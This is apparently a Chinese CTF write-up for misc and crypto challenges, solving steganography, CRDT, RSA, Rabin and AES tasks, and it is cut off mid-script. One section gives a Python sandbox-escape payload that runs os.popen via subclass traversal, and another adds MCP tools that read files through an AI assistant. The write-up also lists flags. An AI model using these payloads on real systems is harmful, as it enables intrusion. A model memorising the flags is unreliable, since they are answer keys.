## gift
给了一个文件打不开，用010editor打开发现开头为pk说明是一个压缩包，最后有一个`ZzFmdA==`用base64解码后是`g1ft`应该就是压缩包密码了，改一下后缀为zip,用winrar解压，得到一个图片，提取盲水印得到flag
![图片](/image/44.png)
## hidden
题目给了一个word文档，打开发现是一个图片，flag应该藏在隐藏文字里，依次点击`文件->更多->选项->显示->勾选隐藏文字`退出后在图片下方显示出了`SYC{adsad`得到第一段flag,所有的 `docx / xlsx / pptx` 文件本质上其实都是zip压缩包，改文件后缀为zip,解压后的文件里有一个word.txt的文件,打开后是`flag2：MzYyZ2V5ZGd3dW5rZHdlZQ==`base64解密后得到第二段flag,还有一个flag3.jpg的文件，打不开，就用010editor打开，发现文件头是`E1 02 45 45`不是任何文件的文件头，文件头很可能被损坏了，根据jpg文件的文件头`FF D8 FF E0/FF D8 FF E1`可以推知可能开头的`FF D8 FF`被删了，补充上去保存，图片打开，得到最后一段flag
![图片](/image/flag3.jpg)
## CRDT
给了一份协同编辑的操作日志，每个对象代表一个操作：
- `"op": "ins"`：插入字符
- `"op": "del"`：删除已有字符
- `"parent"`：表示这个字符要插入到哪个字符 **之后**
- `"id"`：当前字符的唯一标识（比如 "A:1" 表示站点 A 的第 1 次操作）
- `"ch"`：插入的字符
- `"ctr"`:表示这是该站点的第几次操作
- `"site"`:多人协作的不同客户端标识
需要找到最终编辑的字符串，即被ins插入并且未被del删除的字符串，把日志粘贴到一个叫`ops.json`的文件中，再写一个python脚本输出flag
```python
import json  
  
with open("ops.json",'r',encoding='utf-8') as f:  #自动关闭文件
    data = json.load(f)  #把打开的文件 `f` 里 JSON 内容解析成 Python 数据结构，通常是一个 `list`（外层是 `[]`）里面装很多 `dict`（每个操作）。
#提取inserts 和deletes  
inserts = {d["id"]:d for d in data if d["op"] == "ins" } #这是一个字典推导（dict comprehension）。作用：把所有 `op` 字段为 `"ins"` 的操作挑出来，按它们的 `id` 建一个映射（键是 `id`，值是该操作整个字典）。 
deletes = {d["id"] for d in data if d["op"] == "del"}  #这是一个集合推导（set comprehension）。把所有 `op == "del"` 的操作的 `id` 收集到一个集合里。
#去掉被删除的  
inserts = {k:v for k,v in inserts.items() if k not in deletes} #重建了一个新的字典，排除了所有 ID 在 `deletes` 里的项 
#构建parent->children映射  
children={}  
for ins in inserts.values():  
    parent = ins["parent"]  #读取该插入操作的父 id（表示要插到哪个 id 之后）。
    children.setdefault(parent,[]).append(ins)  
#按(site,ctr)排序保持稳定  
for chs in children.values():  
    chs.sort(key=lambda x: (x["site"],x["ctr"]))  #对每个父节点的子列表进行排序，保证同一 parent 下的兄弟节点顺序确定（避免不同运行顺序下得到不同文本）。按元组 `(site, ctr)` 排序，`site`（例如 "A","B","C"）按字母顺序，若 `site` 相同再按 `ctr`（计数器，数字）大小。
#递归构建字符串  
def build(parent="HEAD"):  
    if parent not in children:  
       return ""  
    result = ""  
    for c in children[parent]:  
       result += c["ch"] + build(c["id"])  
    return result  
flag = build("HEAD")  
print(flag)

```
运行得到flag`SYC{CRDT_RGA_CHALLENGE_IS_SO_EASY}`
## evil_mcp
这道题应该是要写mcp服务工具来读取flag,
可以写一个工具列一下根目录
```python

from typing import Any
import os

@tool(
    name="ls_root",
    description="列出根目录文件，类似ls /命令",
    input_schema={"type": "object", "properties": {}, "required": []}
)
async def ls_root(arguments: dict[str, Any], context: Any) -> Any:
    try:
        return {"content": os.listdir("/")}
    except Exception as e:
        return {"error": str(e)}

tool = ls_root
```
把这段代码提交到右面，再问ai`列出根目录下的文件` ai回答`{"content": "{\"content\": [\"media\", \"bin\", \"usr\", \"lib64\", \"sbin\", \"sys\", \"mnt\", \"var\", \"lib\", \"root\", \"proc\", \"opt\", \"tmp\", \"srv\", \"run\", \"home\", \"boot\", \"etc\", \"dev\", \"app\", \"flag\", \"start.sh\"]}", "metadata": {}}`,发现根目录下有一个叫flag的文件，再写一个工具读取flag的文件内容

```python
from typing import Any
import os
@tool(#tool装饰器,将下面的函数标记为一个工具
    name="read_root_flag",
    description="读取根目录下flag文件内容",
    input_schema={"type": "object", "properties": {}, "required": []}#定义工具的输入 schema，这里表示该工具不需要任何输入参数
)
async def read_root_flag(arguments: dict[str, Any], context: Any) -> Any:
    try:
        with open("/flag", "r") as f:
            return {"content": f.read()}
    except Exception as e:
        return {"error": str(e)}

tool = read_root_flag#将函数read_root_flag赋值给变量tool，方便外部引用该工具
```
问ai`读取根目录下flag文件内容`,ai回答得到flag。
## Expression Parser
看起来只能解析 Python 表达式，所以可能是ssti漏洞，输入`().__class__`回显`<class 'tuple'>`,看起来可行，``
继续输入`().__class__.__base__.__subclasses__()`输出一长串，找一下`_frozen_importlib_external.FileLoader`在134的位置，继续输入`().__class__.__base__.__subclasses__()[134].__init__.__globals__['__builtins__']['eval']`回显`<built-in function eval>`说明有eval,但继续输入`().__class__.__base__.__subclasses__()[134].__init__.__globals__['__builtins__']['eval']("__import__")`
回显`Traceback (most recent call last): File "<console>", line 1,in<module>File "<string>", line 1, in <module>NameError: name '__import__' is not defined` 说明名字 `__import__` 被彻底移除了，可以试一下`().__class__.__base__.__subclasses__()[134].__init__.__globals__['__builtins__']['__import__']`回显`<built-in function __import__>`说明取得 Python 内置的 import 函数，继续`().__class__.__base__.__subclasses__()[134].__init__.__globals__['__builtins__']['__import__']('os').popen('env').read()`输出环境变量，搜索SYC得到flag,试过`ls /`目录，但没找到flag,最终flag就藏在环境变量里。
## 4ak5ra
给了一张图片，直接提取LSB得不到有效信息，但有提示:你能找到他之前的头像吗，可能有另一张图片隐藏在这个图片文件里，用foremost工具提取一下，得到另一个不同的图片，用这个图片，用一下Stegsolve.jar
![图片](/image/13.png)
得到flag,把空格去一下最终flag为`SYC{Im_waiting_for_Sakura_t0_become_a_top_pwn_master}`
## monitoring
这道题我用的方法非常笨，我是将两张图片，用肉眼比对互补，再在我的世界里还原出来，用微信扫一下得到flag
![图片](/image/42.png)(这里不知道用我的世界怎么截图，就用手机拍了一下)
![图片](/image/43.png)
## 问卷
填一下问卷，白送flag
## descibe_the_world
文件给了一个txt文件，里面有许多奇怪的字符，正好有1440000个字符，每个字符代表一个像素的话正好可以拼接成一个`1600*900`的图片，又观察到一共有256种字符，每个字符对应一个灰度，为了提高对比度，把`GRAY_LEVELS = 2`只有黑白两种颜色，这样黑色的文字可以和白色的背景分离开。代码
```python
from PIL import Image # 图像处理核心库，负责生成/保存图片  
import numpy as np # 高效处理像素矩阵  
from collections import Counter # 统计字符出现频率  
  
# ===================== 配置区 =====================INPUT_FILE = "data.txt"  # 你的字符文件路径  
IMAGE_SIZE = (1600, 900)  # 严格按原始尺寸  
INPUT_FILE = "data.txt"  # 乱字符文件路径  
OUTPUT_FILE = "clear_image.png"  
# 关键：灰度等级（建议2-4级，等级越少越清晰）  
GRAY_LEVELS = 2  # 2=黑白（最清晰），3=黑/灰/白，4=四级灰度,仅保留黑白两色，对比度拉满，避免灰度渐变导致的模糊  
# ==================================================  
  
# 1. 读取字符并验证总数  
with open(INPUT_FILE, "r", encoding="utf-8") as f:  
    char_data = f.read().strip()  
total_chars = len(char_data)  
assert total_chars == IMAGE_SIZE[0] * IMAGE_SIZE[1], f"字符总数错误"  
  
# 2. 统计字符频率（高频=背景，低频=文字）  
char_count = Counter(char_data) # 统计每个字符的出现次数，例：{'⎄': 100000, 'ë': 80000, ...}  
# 按频率排序（从高到低）  
sorted_chars = [char for char, _ in char_count.most_common()]  
  
# 3. 高对比度灰度映射（按频率分等级，而非Unicode）  
# 例：GRAY_LEVELS=2 → 高频字符=255（白/背景），低频=0（黑/文字）  
gray_step = 255 // (GRAY_LEVELS - 1) if GRAY_LEVELS > 1 else 128  
char_to_gray = {} # 字符→灰度值的映射字典  
for idx, char in enumerate(sorted_chars):  
    # 按频率分配灰度（频率越高，灰度越亮）  
    gray_value = 255 - (idx // (len(sorted_chars) // GRAY_LEVELS)) * gray_step  
    char_to_gray[char] = gray_value  
  
# 4. 生成原始尺寸像素矩阵（无缩放，避免模糊）  
pixel_matrix = []  # 存储所有像素值的二维列表（900行，每行1600个像素）  
for i in range(IMAGE_SIZE[1]):  # 遍历900行（IMAGE_SIZE[1]=900）  
    start = i * IMAGE_SIZE[0]  # 第i行的起始位置：i×1600  
    end = start + IMAGE_SIZE[0] # 第i行的结束位置：i×1600+1600  
    row_chars = char_data[start:end] # 取出第i行的1600个字符  
    # 逐字符映射灰度，无插值  
    row_pixels = [char_to_gray[c] for c in row_chars]  
    pixel_matrix.append(row_pixels)  
  
# 5. 转换为图像（严格1600×900，无缩放）  
pixel_array = np.array(pixel_matrix, dtype=np.uint8) # 转为PIL支持的8位无符号整数数组  
img = Image.fromarray(pixel_array, mode='L') # 'L'表示灰度图（0=黑，255=白）  
  
# 6. 保存原图（关键：关闭压缩，设置高DPI）  
img.save(OUTPUT_FILE, dpi=(300, 300), quality=100)  # 300DPI提升清晰度  
# 可选：生成放大版（用最近邻插值，避免模糊）  
img_enlarged = img.resize((3200, 1800), Image.Resampling.NEAREST)  # 放大2倍，像素块清晰  
img_enlarged.save("clear_image_enlarged.png", dpi=(300, 300))  
  
print(f"✅ 清晰图像已生成：")  
print(f"   - 原始尺寸（无缩放）：{OUTPUT_FILE} (1600×900)")  
print(f"   - 放大版（像素块清晰）：clear_image_enlarged.png (3200×1800)")  
print(f"📊 字符频率前5：{char_count.most_common(5)}")  
print(f"🎨 灰度等级：{GRAY_LEVELS}级（0-{255}）")
```
这样就可以得到图片![](/image/139.png)
解释一下代码
其中
```python
assert total_chars == IMAGE_SIZE[0] * IMAGE_SIZE[1], f"字符总数错误"
```
assert是Python 的断言关键字，作用是「强制检查某个条件是否成立」，不成立则直接报错终止程序；因为`IMAGE_SIZE = (1600, 900)`所以`IMAGE_SIZE[0]==1600` `IMAGE_SIZE[1]==900`  `f"字符总数错误"`是断言失败时抛出的错误提示。
```python
char_count = Counter(char_data)
```
统计每个字符的出现次数，例：{'⎄': 100000, 'ë': 80000, ...},返回字典格式的频率统计结果，键是字符，值是出现次数；
```python
sorted_chars = [char for char, _ in char_count.most_common()]
```
`char_count` 是`Counter(char_data)`的返回值，格式为`Counter({字符1: 次数1, 字符2: 次数2, ...})`，比如`Counter({'⎄': 100000, 'ë': 80000, '┃': 50000})`；
`.most_common` `Counter`的核心方法，返回「按次数从高到低排序的列表」，每个元素是`(字符, 次数)`的元组，比如`[('⎄', 100000), ('ë', 80000), ('┃', 50000), ...]`；
`for char , _ in ` 遍历`.most_common()`返回的元组列表,char取元组的第一个元素，`_`是python约定俗成的占位符，表示我知道元组有第二个元素，但是用不上。
`char for` 列表推导式：把遍历过程中取出的所有`char`收集起来，形成纯字符列表；
```python
gray_step = 255 // (GRAY_LEVELS - 1) if GRAY_LEVELS > 1 else 128
```
这是 Python 「三元表达式」的写法，等价于更易读的`if-else`结构,
```python
if GRAY_LEVELS > 1: 
	gray_step = 255 // (GRAY_LEVELS - 1) # 多灰度等级时计算步长 
else: gray_step = 128 # 仅1个灰度等级时，默认取中间灰度
```
因为`GRAY_LEVELS=2`,所以`gray_step=255`
```python
for idx, char in enumerate(sorted_chars):    
    gray_value = 255 - (idx // (len(sorted_chars) // GRAY_LEVELS)) * gray_step  
    char_to_gray[char] = gray_value
```
遍历「按频率从高到低排序的字符列表」： `idx`：字符的索引（0 = 最高频，1 = 次高频，…）； `char`：当前遍历的字符；
`len(sort_chars)`字符种数。
`len(sort_chars)//GRAY_LEVELS`把所有唯一字符分为两组，一组黑，一组白，
`idx//` 判断当前字符属于哪一组（索引越小，组号越小，频率越高）；
`* gray_step` 组号 × 灰度步长（得到该组对应的灰度偏移量）
`255 - 偏移量` 高频字符→偏移量小→灰度值接近 255（白），低频字符→偏移量大→灰度值接近 0（黑）；
`char_to_gray[char] = gray_value` 把「字符 - 灰度值」的映射关系存入字典，供后续像素转换使用；
```python
row_pixels = [char_to_gray[c] for c in row_chars]  
pixel_matrix.append(row_pixels)
```
`char_to_gray[c]` 查字典：根据字符`c`获取之前分配的灰度值（比如背景字符`⎄`→255，文字字符`u`→0）；
`[char_to_gray[c] for c in row_chars]` 列表推导式：遍历当前行的每个字符，通过`char_to_gray`字典映射为对应的灰度值；
`pixel_matrix.append(row_pixels)` 把当前行的灰度值列表添加到「像素矩阵」中，最终构建 900 行 ×1600 列的二维像素矩阵；
****
## 后面复现了几道院赛的杂项题

## hello
题目给了一张图片，用foremost工具可以提取出来一个压缩包，但是需要密码，可以把密码用ARCHPR工具爆破出来，解出来还是一张图片，这时再用Stegsolve.jar工具LSB提取出信息，得到flag
## D0g3


***
# crypto
## ez_xor
1. **恢复 p 和 q（已知 n = p*q 与 gift = p ^ q）**  
    已知 `n` 和 `p xor q`，可以按位从低到高恢复 p 与 q。理由：把乘法 `p*q` 看作按位卷积（含进位），如果我们固定最低 k 位的 p 与 q，它们乘积 `p*q (mod 2^k)` 就被确定。从最低位开始逐位枚举 p、q 的下一位（0/1），并要求：
    - `(p_partial * q_partial) % 2^k == n % 2^k`
    - `((p_partial ^ q_partial) % 2^k) == gift % 2^k`  
        这样可以用回溯（DFS）或逐位搜索恢复全部位。注意 p,q 为奇素数，最低位都是 1，这能大幅减少分支。
2. **恢复 s 和 r（已知 gift1 = s & r，gift2 = s ^ r）**  
    利用恒等式：`s + r = (s ^ r) + 2*(s & r)`。因此可以计算 `sum_sr = gift2 + 2*gift1`。而 `prod_sr = s*r = N // (p*q)`（已知 N 和 n）。于是 s 和 r 是二次方程的两个根：
    x2−sum_sr⋅x+prod_sr=0x^2 - sum\_sr \cdot x + prod\_sr = 0x2−sum_sr⋅x+prod_sr=0
    判别式 D=sum_sr2−4⋅prod_srD = sum\_sr^2 - 4 \cdot prod\_srD=sum_sr2−4⋅prod_sr。如果 D 是完全平方数，则
    s=(sum_sr+D)/2,r=(sum_sr−D)/2s = (sum\_sr + \sqrt{D})/2,\quad r = (sum\_sr - \sqrt{D})/2s=(sum_sr+D​)/2,r=(sum_sr−D​)/2
    （或交换 s、r）。检验是否为质数以确认正确性。
3. **解密**  
    得到 p,q,r,s 后：
    φ(N)=(p−1)(q−1)(r−1)(s−1)\varphi(N)=(p-1)(q-1)(r-1)(s-1)φ(N)=(p−1)(q−1)(r−1)(s−1)
    计算 d=e−1  φ(N)d = e^{-1} \bmod \varphi(N)d=e−1modφ(N)，然后 m=cd  Nm = c^d \bmod Nm=cdmodN，把长整数转回 bytes 即为 flag。
---
#### 实现（完整 Python 脚本）
下面的脚本实现了上述所有步骤。把题目给出的 N、n、c、gift、gift1、gift2 放入脚本即可直接运行并得到 flag。
```python
from Crypto.Util.number import long_to_bytes, inverse  
  
# ------------------- 填入题目给定数据 -------------------
N = 12114282140129030221139165720039766369206816602912543911543781978648770300084428613171061953060266384429841484428732215252368009811130875276347534941874714457297474025227060487490713853301440917877280771734998220874195868270983517296552761924477514745040473578887509936945790259245154138347432294762694643113545451605193155323886625417458980089197202274810691448592725400564114850712497863770625334209249566232989992606497076063348029665644680946906322428277225178838518025623254240893146791821359089473224900379808514993113560101567320224162858217031176854613011276425771708406954417610317789259885040739954642374667  
n = 91891351711379799931394178123406137903027189477005569059936904007248535049052097057222486024223574959494899324706948906013350601442586596023020519058250868888847562977333671773188012014902448961387215600156932673504112816058893268362611211565216592933077956777032650164332488098756557422740070442941348084921  
c = 3231265723829112665640925095346482445691074656152495613367006320791218303024667683148786980985160622882017055128261102169256263170652774489339801477001275058585666508737704987192764426162573977263344192886400249198007892940084066468570229353879431384001463041292940472308358540532108957894938586227682908251475990882169979412586767210087025064295224506676379057986353004282550774815876093769770845018817117647615011444989401149674886486770646765454314760906436659162076044268401041579090930954919862146749470426101754009562077505810024012143379326028465156444246440949112724465484939452061684185387430755268355807999  
gift  = 5160856643507450510397828582001051679762426399445648048700295372044216322163410374903665868763924707209143638999442462398781974627158916257502760763419216  
gift1 = 10475668758451987289276918780968515546700284023143612685496241510488708701498972819305540608876501965534227236009502810417525671358108167575178008316645429  
gift2 = 2089035701361172996472331829521141923363322027241591404259262848963755908765054555529259508147866255819680957406084877552079796025933552021516283158425474  
e = 65537  
# ---------------------------------------------------------  
  
  
def rec_prod_xor(prod, xors):  
    K = max(prod.bit_length(), xors.bit_length()) + 1  
    cands = [(0, 0)]  
    for k in range(1, K + 1):  
        m = (1 << k)  
        pm = prod & (m - 1)  
        xm = xors & (m - 1)  
        new = []  
        for a, b in cands:  
            for A in (0, 1):  
                for B in (0, 1):  
                    aa = a | (A << (k - 1))  
                    bb = b | (B << (k - 1))  
                    if ((aa ^ bb) & (m - 1)) == xm and ((aa * bb) & (m - 1)) == pm:  
                        new.append((aa, bb))  
        cands = new  
    for a, b in cands:  
        if a * b == prod:  
            return a, b  
  
  
def rec_prod_and_xor(prod, and_, xor_):  
    K = max(prod.bit_length(), and_.bit_length(), xor_.bit_length()) + 1  
    cands = [(0, 0)]  
    for k in range(1, K + 1):  
        m = (1 << k)  
        pm = prod & (m - 1)  
        am = and_ & (m - 1)  
        xm = xor_ & (m - 1)  
        new = []  
        for a, b in cands:  
            for A in (0, 1):  
                for B in (0, 1):  
                    if (A & B) != ((am >> (k - 1)) & 1):  
                        continue  
                    if (A ^ B) != ((xm >> (k - 1)) & 1):  
                        continue  
                    aa = a | (A << (k - 1))  
                    bb = b | (B << (k - 1))  
                    if ((aa * bb) & (m - 1)) == pm:  
                        new.append((aa, bb))  
        cands = new  
    for a, b in cands:  
        if a * b == prod:  
            return a, b  
  
  
# ---- Recover p, q ----  
p, q = rec_prod_xor(n, gift)  
if p > q:  
    p, q = q, p  
  
# ---- Recover r, s ----  
t = N // n  
s, r = rec_prod_and_xor(t, gift1, gift2)  
if s > r:  
    s, r = r, s  
  
phi = (p - 1) * (q - 1) * (r - 1) * (s - 1)  
d = inverse(e, phi)  
m = pow(c, d, N)  
flag = long_to_bytes(m)  
  
print(flag)
```
直接输出flag`syc{we1c0me_t190_ge1k_your_code_is_v1ey_de1psrc!}`
## baby_rabin
题目
```python
from Crypto.Util.number import *  
from gmpy2 import next_prime  
  
from secret import flag  
e=8  
while 1:  
    p = getPrime(512)  
    q = next_prime(p + 2 ** 400)  
    r = getPrime(512)  
    if(p%4==3 and q%4==3 and r%4==3):  
        break  
assert p%4==3 and q%4==3 and r%4==3  
n=p*q*r  
hint=p*q  
m=bytes_to_long(flag)  
C=pow(m,e,n)  
print(f'C={C}')  
print(f'n={n}')  
print(f'hint={hint}')  
'''  
C=451731346880007131332999430306985234187530419447859396067624968918101700861978676040615622417464916959678829732066195225132545956101693588984833424213755513877236702139360270137668415610295492436471366218119012903840729628449361663941761372974624789549775182866112541811446267811259781269568865266459437049508062916974638523947634702667929562107001830919422408810565410106056693018550877651160930860996772712877149329227066558481842344525735406568814917991752005  
n=491917847075013900815069309520768928274976990404751846981543204333198666419468384809286945880906855848713238459489821614928060098982194326560178675579884014989600009897895019721278191710357177079087876324831068589971763176646200619528739550876421709762258644696629617862167991346900122049024287039400659899610706153110527311944790794239992462632602379626260229348762760395449238458507745619804388510205772573967935937419407673995019892908904432789586779953769907  
hint=66035251530240295423188999524554429498804416520951289016547753908652377333150838269168825344004730830028024338415783274479674378412532765763584271087554367024433779628323692638506285635583547190049386810983085033061336995321777237180762044362497604095831885258146390576684671783882528186837336673907983527353  
'''
```
已知：
- 公钥指数 `e = 8`，密文 `C = m^8 mod n`；
- 模 `n = p*q*r`，并且给出了 `hint = p*q`（也就是 `hint` 是 `n` 的两因子之积）；
- 源码里 `p,q,r` 都是 512 位素数，且 `p % 4 == q % 4 == r % 4 == 3`；
- 明文 `m = bytes_to_long(flag)`（通常非常小，远小于单个 512-bit 素数的大小）。
关键观察：
1. 由 `hint = p*q` 可得 `r = n // hint`，所以我们能直接知道第三个素数 `r`（不需要分解 `hint`）。
2. 因为 `r ≡ 3 (mod 4)`，任意平方剩余 `a` 在模 `r` 下的平方根可以通过 `a^{(r+1)/4} (mod r)` 计算得到。
3. `e = 8 = 2^3`，所以对 `C = m^8` 在模 `r` 上做三次“开平方”（每次用上面的幂运算）可以得到 `m (mod r)` 的 8 个可能候选（每次开平方会带来 ± 两个符号选择，总共最多 23=82^3=823=8 个）。
4. 由于 `m`（flag 的整数表示）非常小，远小于 512 位素数 `r`，所以 `m` 在整数范围内就等于 `m (mod r)` —— 换句话说，真实的 `m` 必然是上面 8 个候选之一。
5. 因此枚举这最多 8 个候选，对每个候选在模 `n` 上计算 `candidate^8 mod n` 与给定的 `C` 比较，能唯一确认正确的 `m`，再转回 bytes 即为 flag。
---
#### 详细步骤（算法）
1. 读入已给的整数 `C, n, hint`；
2. 计算 `r = n // hint`；
3. 令集合 `S = { C mod r }`；对 `i = 1..3` 重复：
    - 对集合中每个元素 `a`，计算 `s = pow(a, (r+1)//4, r)`，把 `s` 与 `-s mod r` 加入新集合；
    - 更新 `S` = 新集合（这样三轮后 `S` 中是 `m (mod r)` 的最多 8 个候选）。
4. 遍历 `S` 中每个 `x`，检查 `pow(x, 8, n) == C`，若成立则转换 `long_to_bytes(x)` 得到明文 bytes，打印 flag。
运行脚本
```python
from Crypto.Util.number import long_to_bytes  
  
C = 451731346880007131332999430306985234187530419447859396067624968918101700861978676040615622417464916959678829732066195225132545956101693588984833424213755513877236702139360270137668415610295492436471366218119012903840729628449361663941761372974624789549775182866112541811446267811259781269568865266459437049508062916974638523947634702667929562107001830919422408810565410106056693018550877651160930860996772712877149329227066558481842344525735406568814917991752005  
n = 491917847075013900815069309520768928274976990404751846981543204333198666419468384809286945880906855848713238459489821614928060098982194326560178675579884014989600009897895019721278191710357177079087876324831068589971763176646200619528739550876421709762258644696629617862167991346900122049024287039400659899610706153110527311944790794239992462632602379626260229348762760395449238458507745619804388510205772573967935937419407673995019892908904432789586779953769907  
hint = 66035251530240295423188999524554429498804416520951289016547753908652377333150838269168825344004730830028024338415783274479674378412532765763584271087554367024433779628323692638506285635583547190049386810983085033061336995321777237180762044362497604095831885258146390576684671783882528186837336673907983527353  
  
def solve(C, n, hint):  
    r = n // hint  
    S = {C % r}  
    for _ in range(3):  
        T = set()  
        e = (r + 1) // 4  
        for a in S:  
            x = pow(a, e, r)  
            T.add(x)  
            T.add((-x) % r)  
        S = T  
    for m in S:  
        if pow(m, 8, n) == C:  
            return long_to_bytes(m)  
  
flag = solve(C, n, hint)  
print(flag)
```
运行得到flag`syc{th1s_so_1z_mum_never_ca1r_mytstu1d}`
## S_box
- 程序在 `handle()` 里**直接把 `key1`（128-bit）以明文字符串发送给连接者**：`conn.sendline(str(key1).encode())`。知道 AES 的密钥就是 `key1`
- 同时它还把用该密钥加密后的 `Cipher`（AES-CBC）和 `IV` 发送了出来：`Cipher={Cipher}` 与 `IV={IV}`。有密文、IV、以及密钥，完全足够直接用 AES-CBC 解密并去 padding 得到 `flag`。
先`nc geek.ctfplus.cn 32076`监听一下服务器地址，回显
```
192157127609889603063089571323633455642
Cipher=b"\xcfJ\xc6.\x8b\xf3\x18@\xe3\xd4\xc8\xa2\xa2\xf3\xee@\x8c\xcd'(\xb6\xa8\xf9K\xbe\x96\xb5}\xc3,\xe7?\xe8VlR\xeb\xf4\x05\xb4\t\x1b\xf3\xe5\x9a\x84\x1d#"
IV=b'd\r+\xd3Q Q\x1f\xb8}\xca\xceA\xdc\xc6\x88'
please Input M
```
得到了key1,cipher和IV,可以构造脚本
```python
from Crypto.Cipher import AES  
from Crypto.Util.Padding import unpad  
import ast  
  
key1 = 192157127609889603063089571323633455642  
  
cipher = ast.literal_eval(  
    'b"\\xcfJ\\xc6.\\x8b\\xf3\\x18@\\xe3\\xd4\\xc8\\xa2\\xa2\\xf3\\xee@\\x8c\\xcd\'(\\xb6\\xa8\\xf9K\\xbe\\x96\\xb5}\\xc3,\\xe7?\\xe8VlR\\xeb\\xf4\\x05\\xb4\\t\\x1b\\xf3\\xe5\\x9a\\x84\\x1d#"'  
)  
  
iv = ast.literal_eval(  
    'b"d\\r+\\xd3Q Q\\x1f\\xb8}\\xca\\xceA\\xdc\\xc6\\x88"'  
)  
  
key = key1.to_bytes(16, 'big')  
  
cipher_obj = AES.new(key, AES.MODE_CBC, iv)  
pt = unpad(cipher_obj.decrypt(cipher), 16)  
  
print(pt)  
print(pt.decode())
```
运行得到flag`SYC{SS_B0xx_I1s_ver1y_Differe1c999c}`
## Caesar Slot Machine
服务监听在 `0.0.0.0:19937`，每次连接会进行 **30轮挑战**。每轮随机生成`a ∈ [2, P-1]，b ∈ [0, P-1],shift ∈ [1,25](凯撒加密的偏移量)`
构造提示
```python
plaintext = f"A: {a} B: {b} P: {P}\nPROVIDE X: "
encrypted = caesar_encrypt(plaintext, shift)
```
然后把加密后的字符串发给客户端。
客户端需要发送一个整数 `x`。
服务端验证
```python
i = random.randint(1, 1000)
current = x % P
for _ in range(i):
    current = (a * current + b) % P
if current == (x % P):
    "Correct"
else:
    "Wrong"
```
`current` 的初始值是 `x % P`,循环做 `current = (a * current + b) % P`，重复 `i` 次,最终值要回到自己,这个是一个 **模线性同余方程的固定点问题**：
`x≡(a**i)*x+b*(a**(i−1)+...+a+1)modP`,如果 `i=1`：条件是 `x ≡ a*x + b mod P` → `(a-1)x ≡ -b mod P`,如果 `i>1`，其实这个方程是一样的：任何 `x` 满足:`x≡a∗x+b(modP)`都能通过循环任意次数。
我们有：
`current=x`
第一次迭代：
`current=a∗x+b`
要求最后 `current ≡ x mod P`：
`x≡a∗x+bmod  P`
移项：
`(a−1)x+b≡0mod  P`
`x ≡ -b * (a-1)^{-1} \mod P`
 这里 `(a-1)^{-1}` 是 `mod P` 下的乘法逆元。由于 `a ∈ [2, P-1]` 且 `P` 是质数 `1000000007`，所以 `(a-1)` 一定可逆。你可以直接算出 `x`，不需要考虑 `i`
 **解法思路**
 1. 从提示里解密 `A, B, P`，Caesar 加密，只需要把字母向后移 `26-shift` 位
 2. 用公式计算 `x`  `x = (-b * pow(a-1, -1, P)) % P`
 3. 发送给服务端即可,循环 30 轮后拿到 FLAG。
 但第 2 轮的凯撒解密文本格式完全变了，**每一行都 +shift**，连字母 A/B/P 都会被移成别的字母，数字永远不会变，所以格式可以用 **正则检测数字**
 **脚本**
 ```python
 from pwn import *  
import re  
  
HOST = "geek.ctfplus.cn"  
PORT = 30146  
  
def dec(text, s):  
    r = ""  
    for c in text:  
        if c.isalpha():  
            base = ord('A') if c.isupper() else ord('a')  
            r += chr((ord(c)-base-s)%26+base)  
        else:  
            r += c  
    return r  
  
def get_nums(txt):  
    return list(map(int, re.findall(r":\s*(\d+)", txt)))[:3]  
  
r = remote(HOST, PORT)  
  
for _ in range(30):  
    data = r.recv(2048).decode()  
    for s in range(1,26):  
        d = dec(data, s)  
        nums = get_nums(d)  
        if len(nums)==3:  
            a,b,P = nums  
            break  
    x = (-b * pow(a-1, -1, P)) % P  
    r.sendline(str(x).encode())  
    r.recvline()  
  
print(r.recvline().decode())
 ```
 输出flag`SYC{you_found_the_fixed_point}`  
## pem
给了一个enc文件和key.pem文件，在文件夹打开cmd,先看看是什么类型的pem,以及是否有密码保护，`openssl pkey -in key.pem -text -noout`返回
```
Private-Key: (512 bit, 2 primes)
modulus:
    00:b0:59:6e:80:4a:0c:35:5c:f7:08:81:70:8a:ed:
    b8:09:1a:cb:93:6d:45:cd:a0:23:0d:3b:3d:9a:54:
    c5:63:d7:d6:a5:c8:cf:39:17:54:fb:b7:bf:a2:55:
    f9:4b:ae:33:84:f8:9f:ce:dd:2a:45:b8:48:97:42:
    1c:1e:a2:82:1f
publicExponent: 65537 (0x10001)
privateExponent:
    48:fc:7a:93:76:12:1f:73:de:7a:12:b8:75:87:75:
    87:af:23:5a:5c:fb:6a:e3:40:1e:95:ca:25:39:b8:
    88:5d:78:78:1b:5f:e6:75:ce:f9:67:92:39:9c:94:
    ce:ff:36:50:9c:99:d3:a9:34:9d:50:c2:69:cc:94:
    58:36:3b:01
prime1:
    00:d9:81:06:a9:87:de:ad:8c:38:1d:a2:b5:12:56:
    15:70:d6:7b:70:ce:88:35:78:50:7e:90:e8:8d:30:
    5a:6b:3f
prime2:
    00:cf:8f:b6:7b:4c:37:95:5c:08:2f:ef:db:f6:4a:
    76:d8:a7:bd:d4:a8:30:55:6c:d2:4a:a9:4c:a0:70:
    c4:91:21
exponent1:
    46:65:f8:9e:0e:98:08:5c:06:1d:b1:78:22:03:32:
    d5:5e:d6:7d:60:9b:bd:92:bf:9a:f7:94:0d:7e:c5:
    05:49
exponent2:
    00:a7:84:48:75:d8:7c:9f:ca:08:3d:90:2b:89:ea:
    6d:62:cc:76:d4:13:ed:f6:73:fe:81:0d:84:6f:94:
    b3:c0:a1
coefficient:
    2a:dc:63:5c:21:34:3c:ea:8f:2e:50:a1:ec:f2:fc:
    5b:c6:12:b3:24:20:e0:cb:e0:dd:c3:70:b1:4c:b8:
    90:46
```
这是一个**512-bit RSA 私钥**,用base64加密输出一下enc文件的内容，用
```python
import base64  
with open("enc", "rb") as f:  
    data = f.read()  
with open("enc.b64", "w") as f:  
    f.write(base64.b64encode(data).decode())
```
执行得到enc.b64文件内容为`HhVz1mA88Zuc5CBKvTenEEnnVudGraXGYrqSerB62Xoj5NNbZUbf5EDUQKjviNmZfl4DGefDnFNxWBB+Es2+wg==`不可以直接复制enc源文件里的二进制乱码，因为那是被破坏的，必须拿到精准的二进制密文，RSA解密的核心公式是`m≡c**d(mod n)`,其中**c**是密文（把 Base64 decode 得到二进制，再按大端解释为整数），**d**私钥的私指数，即key.pem 中的 `privateExponent`,**n**：模数（`modulus`）.计算 `m = pow(c, d, n)` 得到一个整数，把它按大端转为字节就是明文,
```python
import base64  
  
